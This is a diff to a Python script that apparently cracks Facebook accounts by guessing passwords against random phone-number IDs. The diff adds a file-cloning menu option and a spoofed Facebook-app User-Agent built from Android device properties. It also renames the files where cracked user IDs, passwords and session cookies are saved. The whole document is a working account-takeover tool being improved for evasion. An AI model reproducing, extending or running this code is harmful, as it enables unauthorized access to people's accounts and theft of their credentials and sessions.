@@ -29,12 +29,17 @@ loop=0
 oks=[]
 cps=[]
 twf=[]
+#------------------[User-Agent]---------
 #--------------------- [ CODE ] -------------------#
 W='\033[1;37m' #WHITE
 G='\033[38;5;46m'
 F='\033[38;5;45m'
 R='\033[38;5;196m'
 #--------------------- [ LOGO ] -------------------#
+def lin3():
+   print('\33[1;37m---------------------------------')
+
+
 fuck = """
 \x1b[1;97m88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
@@ -62,14 +67,35 @@ def xnxx():
 def bhootxx():
     x()
     print('[1] RNDM CRACK')
-    print('[2] EXIT');xnxx()
+    print('[2] FILE CLONING')
+    print('[3] EXIT');xnxx()
     xtx = input('[?] CHOICE : ')
     if xtx in '1':
         rndmx()
-    elif xtx in '2':
+    if xtx in '2':
+    	file()
+    elif xtx in '3':
         print('Allah hafiz ')
         os.system('exit')
 #--------------------- [ RNDM ] -------------------#
+ua= fbcr1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Jazz','Etisalat']
+fbcr = random.choice(fbcr1)
+fban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
+fban = random.choice(fban1)
+fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
+fbpn = random.choice(fbks)
+sim_id=''
+fbsv = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
+model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
+build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
+fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
+fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
+fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
+fbdv = model
+fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
+fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+fbbv = str(random.randint(10000000, 88888888))
+ua = f'[FBAN/{fban};FBAV/{fbav};FBBV/{fbbv};[FBAN/{fban};FBAV/{fbav};FBPN/{fbpn};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbbd};FBDV/{fbdv};FBSV/7.1.2;FBCA/{fbca};FBDM/{fbdm};FB_FW/1;] FBBK/1;]' 
 def rndmx():
     x()
     print('[+] BD SIM CODE : 017,019,018,016 ');xnxx()
@@ -111,6 +137,8 @@ def sexx(ids,passlist):
                         
                         
                         
+                       
+                    
                         
                         
                                 'adid':adid,
@@ -141,7 +169,7 @@ def sexx(ids,passlist):
                                 'Authorization':f'OAuth {accessToken}',
                                 'X-FB-Friendly-Name':'authenticate',
                                 'X-FB-Connection-Type':'unknown',
-                                'User-Agent':None,
+                                'User-Agent':ua,
                                 'Accept-Encoding':'gzip, deflate',
                                 'Content-Type': 'application/x-www-form-urlencoded',
                                 'X-FB-HTTP-Engine': 'Liger'
@@ -162,10 +190,10 @@ def sexx(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print(f'\r\r\033[38;5;46m[+] [BHOOT-OK] {str(uid)} \_/ {pas} ')
+                                        print(f'\r\r\033[38;5;46m[+] [R4FS4N-OK] {str(uid)} \_/ {pas} ')
                                         fxxk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f'=COOKIE= : {fxxk}')
-                                        open('/sdcard/X-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/R4FS4N-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif twf in str(po):
@@ -175,8 +203,8 @@ def sexx(ids,passlist):
                                         uid = idf
                                 if uid in oks:pass
                                 else:
-                                        print(f'\r\r\033[38;5;45m[+] [BHOOT-2F] {uid} \_/ {pas}\033[1;37m')
-                                        open('/sdcard/X-2F.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print(f'\r\r\033[38;5;45m[+] [R4FS4N-2F] {uid} \_/ {pas}\033[1;37m')
+                                        open('/sdcard/R4FS4N-2F.txt','a').write(str(uid)+'|'+pas+'\n')
                                         twf.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -186,8 +214,8 @@ def sexx(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\033[38;5m196m[+] [BHOOT-CP] '+str(uid)+' \_/ '+pas+'\033[1;37m')
-                                        open('/sdcard/X-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[38;5m196m[+] [R4FS4N-CP] '+str(uid)+' \_/ '+pas+'\033[1;37m')
+                                        open('/sdcard/R4FS4N-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
